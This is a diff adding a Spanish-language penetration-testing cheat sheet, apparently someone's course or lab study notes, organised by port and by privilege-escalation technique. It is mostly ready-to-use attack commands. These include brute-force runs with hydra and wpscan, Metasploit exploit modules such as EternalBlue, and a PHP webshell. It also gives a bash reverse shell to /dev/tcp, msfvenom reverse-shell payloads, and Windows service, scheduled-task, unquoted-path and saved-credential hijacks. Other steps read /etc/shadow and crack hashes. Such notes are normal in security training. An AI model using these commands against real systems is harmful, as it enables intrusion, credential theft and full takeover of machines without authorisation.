@@ -1,0 +1,789 @@
+0️⃣ COMANDOS GENERALES (SIEMPRE LO PRIMERO)
+Escaneo inicial
+nmap -vv -sC -sV IP
+nmap -vv IP
+nmap -vv -p- IP
+nmap -sVC -p PUERTOS IP
+nmap -sC -sV -p- IP
+
+Para versiones y scripts:
+
+nmap -vv -sV -sC IP
+
+Escanear puertos concretos:
+
+nmap -vv -sv -p445,139,3389,49152 IP
+
+Escaneo agresivo:
+
+nmap -A IP
+
+Escaneo UDP:
+
+nmap -vv -sU IP
+
+Escaneo 445 SMB scripts:
+
+nmap -vv -p445 -sV --script smb-vuln-* IP
+nmap -vv -sV --script smb-* IP
+nmap -vv -p445 --script smb-os-discovery.nse IP
+
+Evitar ping:
+
+nmap -Pn IP
+
+Evadir firewall:
+
+nmap -vv -p445 --source-port 21 IP
+21️⃣ PUERTO 21 → FTP
+
+Comprobar FTP:
+
+nmap -p21 -sV IP
+
+Entrar al FTP:
+
+ftp IP
+
+Anonymous login:
+
+anonymous
+
+Bruteforce FTP:
+
+hydra -l user -P rockyou.txt ftp://TARGET
+
+Buscar exploit:
+
+searchsploit vsftpd
+
+Metasploit exploit:
+
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST TARGET
+run
+
+FUERZA BRUTA FTP
+
+Si hay usuario:
+
+hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://IP
+
+Usuarios desde archivo:
+
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://IP 
+
+SI FTP PERMITE SUBIR ARCHIVOS (MUY COMÚN)
+
+Subir webshell:
+
+<?php system($_GET['cmd']); ?>
+
+Subir:
+
+put shell.php
+
+Ejecutar:
+
+http://IP/shell.php?cmd=id
+
+Esto aparece en tu máquina Startup. 
+
+máquina STARTUP
+
+9️⃣ REVERSE SHELL DESDE FTP
+
+Primero escuchar:
+
+nc -lvnp 4444
+
+Luego ejecutar en la webshell:
+
+bash -c 'bash -i >& /dev/tcp/IPKALI/4444 0>&1'
+
+
+
+
+22️⃣ PUERTO 22 → SSH
+
+Login normal:
+
+ssh user@IP
+
+Con puerto:
+
+ssh user@IP -p 2222
+
+Bruteforce:
+
+hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://IP
+hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://IP -V
+
+Conectar con clave:
+
+ssh -i id_rsa user@IP
+
+Convertir clave para crackear:
+
+ssh2john id > hash.txt
+
+Crackear clave:
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+idrsa ssh no me deja leer con u…
+
+john --show hash.txt
+
+BUSCAR ARCHIVOS INTERESANTES
+ls -la
+
+Leer archivo:
+
+cat archivo.txt
+
+Ejemplo:
+
+cat pass.bak
+
+
+
+
+
+80️⃣ PUERTO 80 → WEB
+
+Enumerar web:
+detectar CMS
+whatweb http://IP
+
+
+dirb http://TARGET
+nikto -h http://TARGET
+gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt
+dirsearch -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+WordPress:
+
+wpscan --url http://TARGET
+wpscan --url http://TARGET -e u
+wpscan --url http://TARGET -e vp,vt,u  ---> plugins vuln, usuarios, versiones.
+
+Ataque de diccionario WordPress:
+
+wpscan --url http://blog.thm/wp-login.php \
+--usernames users.txt \
+--passwords /usr/share/wordlists/rockyou.txt
+
+Bruteforce login web:
+
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt http-post-form
+
+Ejemplo completo:
+
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered"
+
+
+
+139 / 445 → SMB
+
+Enumerar shares:
+
+smbclient -L //IP -N
+
+Entrar share:
+
+smbclient //IP/Anonymous -N
+
+Listar archivos:
+
+ls
+
+Descargar:
+
+get archivo.txt
+
+Enumeración SMB:
+
+enum4linux IP
+
+Buscar exploit:
+
+searchsploit samba
+
+Metasploit:
+
+use exploit/multi/samba/usermap_script
+set RHOSTS TARGET
+run
+
+Windows SMB exploit:
+
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST TARGET
+run
+
+Psexec si hay credenciales:
+
+use exploit/windows/smb/psexec
+set SMBUser user
+set SMBPass password
+set RHOST TARGET
+run
+
+Alternativa python:
+
+psexec.py DOMAIN/user:pass@TARGET
+
+exploits
+
+3389 → RDP (WINDOWS)
+
+Bruteforce:
+
+hydra -l administrator -P rockyou.txt rdp://TARGET
+
+Conectar:
+
+xfreerdp /u:user /p:password /v:IP
+8000 → ICECAST
+
+Escaneo:
+
+nmap -p 8000 -sV IP
+
+Buscar exploit:
+
+search icecast
+
+Metasploit:
+
+use exploit/windows/http/icecast_header
+set RHOSTS IP
+set LHOST MI_IP
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+Meterpreter:
+
+getuid
+sysinfo
+run post/multi/recon/local_exploit_suggester
+background
+sessions
+
+exploits
+
+8080 → TOMCAT
+
+Buscar exploit:
+
+searchsploit tomcat
+
+Entrar:
+
+http://IP:8080/manager
+
+Credenciales típicas:
+
+tomcat:tomcat
+admin:admin
+
+Subir:
+
+WAR shell
+
+exploits 2
+
+3632 → DISTCC
+
+Buscar exploit:
+
+searchsploit distcc
+
+Metasploit:
+
+use exploit/unix/misc/distcc_exec
+set RHOSTS TARGET
+run
+
+exploits 2
+
+6667 → IRC
+
+Exploit:
+
+searchsploit unrealircd
+
+Metasploit:
+
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOST TARGET
+run
+
+exploits 2
+
+🔑 ESCALADA PRIVILEGIOS(LINUX)
+
+Buscar SUID:
+
+find / -perm -4000 -type f 2>/dev/null
+
+Buscar sudo:
+
+sudo -l
+
+---------------------------------------------------------------------
+NUMERACIÓN DEL SISTEMA
+
+Versión del kernel:
+
+uname -a
+
+Ver interfaces de red:
+
+ip a
+
+4 DE FEBRERO HACKING ALEJANDRO
+
+4️⃣ USAR LINPEAS
+
+En Kali:
+
+python -m http.server 8080
+
+4 DE FEBRERO HACKING ALEJANDRO
+
+En la máquina víctima:
+
+cd /tmp
+
+Descargar linpeas:
+
+wget http://IPKALI:8080/linpeas.sh
+
+Dar permisos:
+
+chmod +x linpeas.sh
+
+Ejecutar:
+
+./linpeas.sh
+
+4 DE FEBRERO HACKING ALEJANDRO
+
+5️⃣ ENUMERAR SUDO
+
+Muy importante:
+
+sudo -l
+
+Si sale NOPASSWD, puedes escalar privilegios.
+
+4 DE FEBRERO HACKING ALEJANDRO
+
+6️⃣ ESCALADA CON GTFOBINS
+
+Si aparece un binario permitido con sudo:
+
+Ejemplo:
+
+sudo less /etc/passwd
+
+Desde ahí puedes ejecutar shell.
+
+4 DE FEBRERO HACKING ALEJANDRO
+
+7️⃣ ENUMERAR BINARIOS SUID
+
+Buscar binarios SUID:
+
+find / -perm -u=s -type f 2>/dev/null
+
+Si alguno está en GTFOBINS, puedes escalar privilegios.
+
+8️⃣ EJEMPLO SUID (base64)
+
+Si base64 tiene SUID:
+
+base64 /etc/shadow
+
+Permite leer archivos de root.
+
+4 DE FEBRERO HACKING ALEJANDRO
+
+9️⃣ ENUMERAR CRON JOBS (MUY IMPORTANTE EN EXAMEN)
+
+Ver tareas programadas:
+
+cat /etc/crontab
+
+4 DE FEBRERO HACKING ALEJANDRO
+
+🔟 BUSCAR SCRIPT VULNERABLE
+
+Ejemplo:
+
+cd /home/Karen/
+
+Listar:
+
+ls -lah
+
+
+
+1️⃣1️⃣ MODIFICAR SCRIPT CRON
+
+Editar script:
+
+nano backup.sh
+
+Insertar reverse shell.
+
+
+
+1️⃣2️⃣ DAR PERMISOS
+chmod +x backup.sh
+
+
+
+1️⃣3️⃣ LISTENER EN KALI
+
+Abrir escucha:
+
+nc -lvnp 443
+
+Cuando se ejecute el cron job → shell root.
+
+
+
+🔑 ESCALADA PRIVILEGIOS (WINDOWS)
+
+PREPARAR WINPEAS EN KALI
+
+Ir al directorio:
+
+cd /usr/share/peass
+
+Ver herramientas:
+
+ls
+
+Entrar en winpeas:
+
+cd winpeas
+
+Ver archivos:
+
+ls -lah
+
+16 DE FEBRERO HACKING ALEJANDRO
+
+4️⃣ LEVANTAR SERVIDOR WEB EN KALI
+python3 -m http.server 8080
+5️⃣ DESCARGAR WINPEAS EN WINDOWS
+curl -O http://IPKALI:8080/winPEASany_ofs.exe
+
+Comprobar:
+
+dir
+
+Ejecutar:
+
+winPEASany_ofs.exe
+
+----------------------------------------------
+ESCALADAPRIVILEGIOS WINDOWS (ORDEN REAL)
+abrimos rdp: (SE NOS ABRE EL ESCRITORIO WINDOWS) y nos vamos a la cmd dentro--> WINDOWS+R
+xfreerdp3 /u:user /p:password321 /cert:ignore /v:IP  
+PASO 1 — WINPEAS. PASARLA A LA TERMINAL QUE SE NOS ACABA DE ABRIR EN WINDOWS. 
+
+Lo primero que haces cuando tienes shell.
+
+whoami
+hostname
+systeminfo
+whoami /priv
+whoami /groups
+
+Ver usuarios:
+net user
+
+INSECURE SERVICE PERMISSIONS
+
+C:\PrivEsc\
+
+Compruébalo:
+
+dir C:\PrivEsc
+
+Deberías ver:
+
+ejecutar ---> accesschk.exe
+ejecutar-----> C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+-uwcqv user (nombre)
+
+
+
+
+Si el resultado muestra algo como:
+
+SERVICE_CHANGE_CONFIG
+SERVICE_START
+WRITE_DAC
+WRITE_OWNER
+
+entonces puedes modificar el servicio.
+
+COMANDO SIGUIENTE
+
+Una vez encuentras el servicio vulnerable, miras su configuración:
+
+sc qc daclsvc
+
+Esto te dice:
+
+BINARY_PATH_NAME
+SERVICE_START_NAME
+
+Ejemplo:
+
+SERVICE_START_NAME: LocalSystem
+
+Eso significa que el servicio corre como SYSTEM.
+
+6️⃣ ENTONCES HACES ESTO
+
+Primero creas tu reverse shell en Kali:
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPKALI LPORT=8888 -f exe -o reverse.exe
+7️⃣ SUBES EL PAYLOAD
+curl -O http://IPKALI:8080/reverse.exe
+8️⃣ CAMBIAS EL SERVICIO
+sc config daclsvc binPath= "C:\Users\user\reverse.exe"
+9️⃣ LO EJECUTAS
+net start daclsvc
+
+pero podría llamarse también: EN VEZ de daclsv
+
+backupservice
+updateservice
+antivirusservice
+
+Y obtienes shell SYSTEM.
+
+
+Scheduled tasks vulnerable TAREA PROGRAMADA 
+WinPEAS suele mostrar algo como:
+
+Scheduled tasks vulnerable
+
+Y algo parecido a:
+
+C:\DevTools\CleanUp.ps1
+
+Eso significa que una tarea programada ejecuta ese script.
+
+5️⃣ VER EL SCRIPT
+
+Copiar y pegar:
+
+type C:\DevTools\CleanUp.ps1
+
+Esto muestra qué hace el script.
+
+6️⃣ COMPROBAR PERMISOS DEL SCRIPT
+
+Usamos AccessChk.
+
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+7️⃣ QUÉ ESTÁS BUSCANDO
+
+Si el resultado muestra algo como:
+
+FILE_WRITE_DATA
+FILE_APPEND_DATA
+WRITE
+
+significa:
+
+puedes modificar el archivo
+
+Eso es la vulnerabilidad.
+
+8️⃣ CREAR PAYLOAD (REVERSE SHELL)
+
+En Kali:
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPKALI LPORT=8888 -f exe -o reverse.exe
+9️⃣ SUBIR PAYLOAD
+
+En Windows:
+
+curl -O http://IPKALI:8080/reverse.exe
+
+Comprobar:
+
+dir
+🔟 ABRIR LISTENER
+
+En Kali:
+
+nc -lvnp 8888
+1️⃣1️⃣ MODIFICAR EL SCRIPT
+
+Añadir tu reverse shell al script.
+
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+
+Esto añade la ejecución del payload.
+
+1️⃣2️⃣ ESPERAR A QUE SE EJECUTE LA TAREA
+
+Las tareas programadas suelen ejecutarse:
+
+cada minuto
+cada 5 minutos
+cada hora
+
+Cuando se ejecute:
+
+ejecutará reverse.exe
+
+y obtendrás:
+
+shell SYSTEM
+
+
+
+SAVED CREDS
+
+cmdkey /list
+
+
+Ejemplo de resultado:
+
+Currently stored credentials:
+
+Target: Domain:interactive=admin
+Type: Domain Password
+User: admin
+
+Si aparece algo así, significa que la contraseña de ese usuario está guardada en el sistema.
+
+copy reverse.exe C:PrivEsc\reverse.exe
+C:\Users\user>runas /savedcred /user:admin C:\PrivEsc\reverse.exe
+poner en mi kali a la escucha:
+nc -lvnp 8888
+Ahora ejecutas el payload como admin usando las credenciales guardadas.
+
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+
+Cuando reverse.exe se ejecuta:
+
+Windows víctima → se conecta a Kali
+
+Entonces en Kali verás algo así:
+
+connect to [IPKALI] from [IPVICTIMA]
+
+Y obtendrás una shell.
+
+
+
+Unquoted Path Service
+Primero lista los servicios y sus rutas:
+
+wmic service get name,displayname,pathname,startmode
+
+Ejemplo de salida vulnerable:
+
+UnquotedService   C:\Program Files\Unquoted Path Service\Common Files\service.exe
+
+Lo que buscas:
+
+C:\Program Files\Unquoted Path Service\Common Files\service.exe
+
+❗ Tiene espacios y no tiene comillas:
+
+"C:\Program Files\Unquoted Path Service\Common Files\service.exe"
+
+Eso es lo que genera la vulnerabilidad.
+
+Ahora miras el servicio concreto:
+sc qc unquotedsvc
+
+
+Esto muestra:
+
+SERVICE_NAME: unquotedsvc
+BINARY_PATH_NAME: C:\Program Files\Unquoted Path Service\Common Files\service.exe
+
+Si ves espacios sin comillas → posible Unquoted Path.
+
+Comprobar si puedes escribir en la carpeta
+
+Aquí usas AccessChk.
+
+Comando exacto:
+
+C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+
+Si sale algo como:
+
+BUILTIN\Users RW
+
+significa que los usuarios pueden escribir en esa carpeta.
+
+Eso confirma la vulnerabilidad.
+
+
+
+EN MI KALI:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IPKALI LPORT=8888 -f exe -o reverse.exe
+python3 -m http.server 8080
+
+DESCARGAR EN VÍCTIMA: curl -O http://IPKALI:8080/reverse.exe
+Comprobar que llegó
+dir
+
+Debería aparecer:
+
+reverse.exe
+
+COPIAME EL REVERSE.EXE PERO CON EL NOMBRE DE  NOMBRE.EXE (LA RUTA QUE HAYAMOS ENCONTRADO VULNERABLE):
+copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+
+MI KALI:
+nc -lvnp 8888
+y ejecutamos servicio en WINDOWS;
+net start unquotedsvc
+
+
+
+
+
+
+
+🔓 HASH CRACKING
+
+Identificar hash:
+
+hashid HASH
+
+Guardar hash:
+
+echo 'HASH' > hash.txt
+
+Crackear:
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+Mostrar resultado:
+
+john --show hash.txt
+
+Hashcat:
+
+hashcat -m 3200 bcrypt.txt /usr/share/wordlists/rockyou.txt
